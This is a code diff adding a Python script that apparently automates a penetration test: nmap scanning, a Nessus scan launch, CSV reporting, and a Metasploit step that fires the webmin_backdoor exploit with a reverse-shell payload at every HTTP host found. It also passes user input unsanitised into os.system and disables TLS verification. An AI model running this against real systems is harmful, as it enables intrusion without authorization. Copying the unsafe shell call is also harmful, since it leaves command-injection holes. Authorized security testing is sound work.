@@ -1,0 +1,131 @@
+import os
+import requests
+import xmltodict
+import pandas as pd
+import pexpect
+
+# Configuration
+NMAP_OUTPUT = "nmap_results.xml"
+NESSUS_URL = "https://<NESSUS_SERVER>:8834"  # Replace <NESSUS_SERVER> with actual server address
+METASPLOIT_LOG = "metasploit_log.txt"
+REPORT_FILE = "penetration_test_report.csv"
+
+# Step 1: Nmap Scanning
+def run_nmap_scan(target):
+    print("[*] Running Nmap scan...")
+    os.system(f"nmap -A -oX {NMAP_OUTPUT} {target}")
+    print("[*] Nmap scan completed.")
+
+def parse_nmap_results():
+    print("[*] Parsing Nmap results...")
+    with open(NMAP_OUTPUT, 'r') as file:
+        nmap_data = xmltodict.parse(file.read())
+    results = []
+    for host in nmap_data['nmaprun']['host']:
+        ip = host['address']['@addr']
+        ports = host.get('ports', {}).get('port', [])
+        if isinstance(ports, dict):  # If only one port is open
+            ports = [ports]
+        for port in ports:
+            results.append({
+                "ip": ip,
+                "port": port['@portid'],
+                "service": port['service']['@name'] if 'service' in port else "unknown"
+            })
+    print("[*] Nmap results parsed.")
+    return results
+
+# Step 2: Nessus Vulnerability Scanning
+def nessus_login(username, password):
+    print("[*] Logging into Nessus...")
+    response = requests.post(
+        f"{NESSUS_URL}/session",
+        json={"username": username, "password": password},
+        verify=False
+    )
+    token = response.json().get('token')
+    if token:
+        print("[*] Nessus login successful.")
+    else:
+        print("[!] Nessus login failed. Check your credentials.")
+    return token
+
+def run_nessus_scan(token, scan_id):
+    print("[*] Starting Nessus scan...")
+    headers = {'X-Cookie': f'token={token}'}
+    response = requests.post(
+        f"{NESSUS_URL}/scans/{scan_id}/launch",
+        headers=headers,
+        verify=False
+    )
+    print("[*] Nessus scan launched.")
+    return response.json()
+
+# Step 3: Exploitation with Metasploit
+def run_metasploit_exploit(target_ip, exploit, payload):
+    print(f"[*] Running Metasploit exploitation on {target_ip}...")
+    session = pexpect.spawn('msfconsole', timeout=300)
+    session.expect('msf >')
+    session.sendline(f'use {exploit}')
+    session.expect('msf >')
+    session.sendline(f'set RHOST {target_ip}')
+    session.expect('msf >')
+    session.sendline(f'set PAYLOAD {payload}')
+    session.expect('msf >')
+    session.sendline('run')
+    session.expect('msf >')
+    with open(METASPLOIT_LOG, "a") as log_file:
+        log_file.write(session.before.decode())
+    print(f"[*] Exploitation on {target_ip} completed.")
+
+# Step 4: Report Generation
+def generate_report(scan_results, exploits):
+    print("[*] Generating final report...")
+    report_data = []
+    for result in scan_results:
+        ip = result['ip']
+        port = result['port']
+        service = result['service']
+        exploited = any(exp['ip'] == ip for exp in exploits)
+        report_data.append({
+            "IP": ip,
+            "Port": port,
+            "Service": service,
+            "Exploited": exploited
+        })
+    df = pd.DataFrame(report_data)
+    df.to_csv(REPORT_FILE, index=False)
+    print(f"[*] Report generated: {REPORT_FILE}")
+
+# Main Function
+def run_penetration_test():
+    # Get user input
+    target_subnet = input("Enter the target subnet (e.g., 192.168.1.0/24): ")
+    nessus_username = input("Enter your Nessus username: ")
+    nessus_password = input("Enter your Nessus password: ")
+    nessus_scan_id = input("Enter the Nessus scan ID: ")
+
+    # Step 1: Nmap Scan
+    run_nmap_scan(target_subnet)
+    nmap_results = parse_nmap_results()
+
+    # Step 2: Nessus Scan
+    token = nessus_login(nessus_username, nessus_password)
+    if not token:
+        print("[!] Nessus scan cannot proceed without a valid token.")
+        return
+    run_nessus_scan(token, nessus_scan_id)
+
+    # Step 3: Exploitation
+    exploits = []
+    for result in nmap_results:
+        if result['service'] == 'http':  # Example condition for HTTP services
+            run_metasploit_exploit(result['ip'], 'exploit/unix/webapp/webmin_backdoor', 'cmd/unix/reverse')
+            exploits.append({"ip": result['ip'], "exploit": "webmin_backdoor"})
+
+    # Step 4: Generate Report
+    generate_report(nmap_results, exploits)
+
+# Execute the Tool
+if __name__ == "__main__":
+    run_penetration_test()
